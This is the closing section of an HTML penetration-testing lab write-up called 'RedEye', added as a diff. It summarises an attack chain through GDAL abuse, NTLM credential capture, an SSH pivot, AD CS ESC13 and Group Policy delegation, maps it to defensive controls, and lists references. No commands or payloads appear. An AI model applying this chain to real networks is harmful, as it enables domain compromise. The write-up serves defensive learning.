+<tr><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td><td>Administrative SMB and SMBExec used on Windows hosts</td></tr></tbody></table></div>
+
+<h2 id="conclusion">19. Conclusion</h2>
+
+<p>RedEye rewarded viewing the environment as a connected trust system rather than a collection of isolated vulnerabilities. The public web application exposed the first primitive, but the compromise depended on how the geospatial worker, chat integration, Windows authentication, Linux SSH, AD CS and Group Policy delegations interacted.</p>
+
+<p>The strongest defensive lesson is that no single product control would have been sufficient. Disabling unsafe GDAL features would have prevented initial access. Removing NTLMv1 or blocking outbound SMB would have stopped credential capture. LAPS and removal of autologon secrets would have limited the workstation compromise. Restricting SSH would have removed the stable pivot. Correcting ESC13 or WriteGPLink would have stopped domain escalation. Allowlisting LDAP and SMB policy servers would have prevented DC01 from retrieving the rogue policy.</p>
+
+<p>Both flags were obtained and submitted successfully. Their values and all reusable secrets remain redacted from this report.</p>
+
+<h2 id="references">References</h2>
+
+<ul><li><a href="https://gdal.org/en/stable/drivers/raster/vrt.html" target="_blank" rel="noopener">GDAL Virtual Raster documentation</a></li>
+<li><a href="https://gdal.org/en/stable/user/security.html" target="_blank" rel="noopener">GDAL security considerations</a></li>
+<li><a href="https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level" target="_blank" rel="noopener">Microsoft: Network security - LAN Manager authentication level</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/advanced-audit-policy-configuration" target="_blank" rel="noopener">Microsoft: Advanced audit policy configuration</a></li>
+<li><a href="https://learn.microsoft.com/windows/security/threat-protection/auditing/audit-certification-services" target="_blank" rel="noopener">Microsoft: Audit Certification Services</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/identity/ad-cs/secure-delegate-audit-certification-authority" target="_blank" rel="noopener">Microsoft: Secure, delegate and audit AD CS administration</a></li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768" target="_blank" rel="noopener">Microsoft: Event 4768 - Kerberos TGT requested</a></li>
+<li><a href="https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5136" target="_blank" rel="noopener">Microsoft: Event 5136 - Directory service object modified</a></li>
+<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">Microsoft Sysmon</a></li>
+<li><a href="https://research.splunk.com/endpoint/350032cd-3d3f-4278-afc8-e01cf5c33524/" target="_blank" rel="noopener">Splunk Security Content: Scheduled Task Created by GPO</a></li>
+<li><a href="https://help.splunk.com/en/splunk-enterprise/common-information-model/6.4/data-models/endpoint" target="_blank" rel="noopener">Splunk Endpoint Common Information Model</a></li>
+<li><a href="https://www.elastic.co/docs/reference/security/prebuilt-rules" target="_blank" rel="noopener">Elastic Security prebuilt rules</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1187/" target="_blank" rel="noopener">MITRE ATT&amp;CK T1187 - Forced Authentication</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1484/001/" target="_blank" rel="noopener">MITRE ATT&amp;CK T1484.001 - Group Policy Modification</a></li></ul>
+<p><a class="back" href="../index.html#lab">back to Hacking Lab</a></p></article><footer><div class="wrap">RedEye · completed · write-up by Luke · <a href="../index.html#lab">all writeups</a></div></footer></body></html>
